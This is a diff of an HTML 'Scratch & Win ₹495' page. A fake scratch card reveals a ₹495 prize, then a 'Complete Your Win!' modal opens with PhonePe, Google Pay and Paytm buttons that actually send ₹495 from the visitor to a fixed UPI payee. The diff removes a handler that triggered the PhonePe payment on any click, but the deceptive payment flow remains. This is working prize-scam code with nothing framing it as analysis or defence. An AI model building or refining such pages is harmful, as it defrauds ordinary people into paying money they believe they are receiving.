@@ -1,15 +1,15 @@
-<!DOCTYPE html>
+
+     <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Scratch Card with UPI</title>
+  <title>Scratch & Win ₹495</title>
   <style>
     body {
       background: #fff;
       margin: 0;
-      padding: 0;
-      font-family: sans-serif;
+      font-family: 'Segoe UI', sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -85,43 +85,62 @@
       animation: blink 2s infinite;
     }
 
-    .hidden {
-      display: none;
-    }
+    .hidden { display: none; }
 
-    /* Modal */
+    /* Modal Style */
     .modal {
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
-      background: rgba(0,0,0,0.6);
+      background: rgba(0,0,0,0.7);
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       z-index: 999;
+      animation: fadeIn 0.5s ease-in-out;
     }
+
     .modal-content {
-      background: white;
-      padding: 20px;
+      background: #fff;
       border-radius: 15px;
-      text-align: center;
+      padding: 20px;
       width: 90%;
-      max-width: 320px;
+      max-width: 340px;
+      text-align: center;
+      box-shadow: 0 5px 25px rgba(0,0,0,0.3);
+      animation: slideUp 0.4s ease-out;
     }
-    .upi-button {
-      background: #2e7d32;
-      color: white;
-      padding: 12px;
-      margin: 8px 0;
-      border: none;
-      border-radius: 8px;
+
+    .modal-content h3 {
+      margin-bottom: 15px;
+      font-size: 20px;
+      font-weight: 600;
+    }
+
+    .upi-btn {
+      display: block;
       width: 100%;
+      padding: 12px;
+      border-radius: 8px;
       font-size: 16px;
       font-weight: bold;
+      color: white;
+      margin: 10px 0;
+      text-decoration: none;
     }
-    .upi-button.phonepe { background: #4b2dab; }
-    .upi-button.gpay { background: #0f9d58; }
-    .upi-button.paytm { background: #0033cc; }
+
+    .upi-btn.phonepe { background: #4b2dab; }
+    .upi-btn.gpay { background: #0f9d58; }
+    .upi-btn.paytm { background: #002e6e; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; } to { opacity: 1; }
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(50px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
   </style>
 </head>
 <body>
@@ -129,7 +148,7 @@
   <img src="https://i.ibb.co/nNCT43nb/IMG-1114.jpg" alt="Top" class="top-img" />
 
   <div class="card-container">
-    <img src="https://i.ibb.co/9m8Y3s3R/IMG-1116.png" alt="Reward" class="reward-layer hidden" id="rewardImage" />
+    <img src="https://i.ibb.co/9m8Y3s3R/IMG-1116.png" class="reward-layer hidden" id="rewardImage" />
     <div class="reward-amount hidden" id="rewardAmount">₹495</div>
     <canvas id="scratchCanvas"></canvas>
     <div class="scratch-text" id="scratchText">Scratch here!</div>
@@ -140,13 +159,13 @@
   <audio id="winSound" src="https://files.catbox.moe/0pc7om.mp3"></audio>
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
-  <!-- UPI Modal -->
-  <div id="upiModal" class="modal hidden">
+  <!-- Modal -->
+  <div class="modal hidden" id="upiModal">
     <div class="modal-content">
-      <h3>Select UPI App</h3>
-      <button class="upi-button phonepe" onclick="pay('phonepe')">Pay with PhonePe</button>
-      <button class="upi-button gpay" onclick="pay('gpay')">Pay with Google Pay</button>
-      <button class="upi-button paytm" onclick="pay('paytm')">Pay with Paytm</button>
+      <h3>Complete Your Win!</h3>
+      <a class="upi-btn phonepe" href="#" onclick="pay('phonepe')">Pay with PhonePe</a>
+      <a class="upi-btn gpay" href="#" onclick="pay('gpay')">Pay with Google Pay</a>
+      <a class="upi-btn paytm" href="#" onclick="pay('paytm')">Pay with Paytm</a>
     </div>
   </div>
 
@@ -157,8 +176,8 @@
     const rewardImage = document.getElementById("rewardImage");
     const rewardAmount = document.getElementById("rewardAmount");
     const sound = document.getElementById("winSound");
-    const container = document.querySelector(".card-container");
     const modal = document.getElementById("upiModal");
+    const container = document.querySelector(".card-container");
 
     canvas.width = container.offsetWidth;
     canvas.height = container.offsetHeight;
@@ -172,9 +191,7 @@
       ctx.drawImage(scratchLayer, 0, 0, canvas.width, canvas.height);
     };
 
-    let isDrawing = false;
-    let lastX = 0, lastY = 0;
-    let revealed = false;
+    let isDrawing = false, revealed = false, lastX = 0, lastY = 0;
 
     function getPosition(e) {
       const rect = canvas.getBoundingClientRect();
@@ -197,9 +214,8 @@
       ctx.lineJoin = "round";
       ctx.lineWidth = 40;
       ctx.beginPath();
-      if (start) {
-        ctx.moveTo(x, y);
-      } else {
+      if (start) ctx.moveTo(x, y);
+      else {
         ctx.moveTo(lastX, lastY);
         ctx.lineTo(x, y);
         ctx.stroke();
@@ -218,30 +234,24 @@
     }
 
     function showConfetti() {
-      confetti({
-        particleCount: 200,
-        spread: 70,
-        origin: { y: 0.6 }
-      });
+      confetti({ particleCount: 180, spread: 70, origin: { y: 0.6 } });
     }
 
     function checkReveal() {
-      if (revealed) return;
-      if (getScratchedPercent() >= 30) {
-        revealed = true;
-        canvas.classList.add("hidden");
-        scratchText.classList.add("hidden");
-        rewardImage.classList.remove("hidden");
-        rewardAmount.classList.remove("hidden");
-        try { sound.play().catch(() => {}); } catch (e) {}
-        showConfetti();
-        setTimeout(() => {
-          modal.classList.remove("hidden");
-        }, 3000);
-      }
+      if (revealed || getScratchedPercent() < 30) return;
+      revealed = true;
+      canvas.classList.add("hidden");
+      scratchText.classList.add("hidden");
+      rewardImage.classList.remove("hidden");
+      rewardAmount.classList.remove("hidden");
+      sound.play().catch(() => {});
+      showConfetti();
+
+      setTimeout(() => {
+        modal.classList.remove("hidden");
+      }, 3000);
     }
 
-    // Mouse events
     canvas.addEventListener("mousedown", (e) => {
       const { x, y } = getPosition(e);
       startScratch(x, y);
@@ -255,7 +265,6 @@
     canvas.addEventListener("mouseup", () => isDrawing = false);
     canvas.addEventListener("mouseleave", () => isDrawing = false);
 
-    // Touch events
     canvas.addEventListener("touchstart", (e) => {
       const { x, y } = getPosition(e);
       startScratch(x, y);
@@ -269,14 +278,13 @@
     });
     canvas.addEventListener("touchend", () => isDrawing = false);
 
-    // Pay function
     function pay(app) {
       const pa = "g1g4822917.rzp@icici";
       const tr = "RZPQhptbTHPKvHtK8qrv2";
       const pn = "G1G4";
       const am = "495";
+      const tn = "ScratchWin";
       const cu = "INR";
-      const tn = "Scratch Card Win";
 
       let uri = "";
       if (app === "phonepe") {
@@ -290,12 +298,7 @@
       }
       window.location.href = uri;
     }
-
-    // Click anywhere to instantly trigger PhonePe
-    document.body.addEventListener("click", function pageClickRedirectOnce() {
-      window.location.href = `phonepe://pay?pa=g1g4822917.rzp@icici&pn=G1G4&tr=RZPQhptbTHPKvHtK8qrv2&tn=InstantClick&am=495&cu=INR`;
-      document.body.removeEventListener("click", pageClickRedirectOnce);
-    }, { once: true });
   </script>
 </body>
 </html>
+ 
